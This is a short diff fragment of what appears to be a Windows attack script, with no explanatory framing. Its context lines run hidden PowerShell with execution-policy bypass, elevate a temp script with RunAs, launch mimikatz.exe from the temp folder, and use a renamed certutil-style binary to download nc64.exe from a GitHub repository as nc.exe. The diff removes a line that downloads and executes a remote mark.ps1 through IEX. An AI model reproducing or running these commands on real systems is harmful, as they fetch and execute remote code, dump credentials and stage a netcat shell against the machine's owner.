@@ -7,7 +7,7 @@ powershell.exe -windowstyle hidden -ep Bypass -nop -noexit -Command "(New-Object
 
 powershell.exe "Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File %Temp%\mark.ps1' -Verb RunAs"
 
-powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inwestallis/first_repository/master/mark.ps1')"
+
 start %temp%\mimikatz.exe
 
 %temp%\cr.tmp -urlcache -split -f https://github.com/inwestallis/first_repository/raw/master/nc64.exe %Temp%\nc.exe
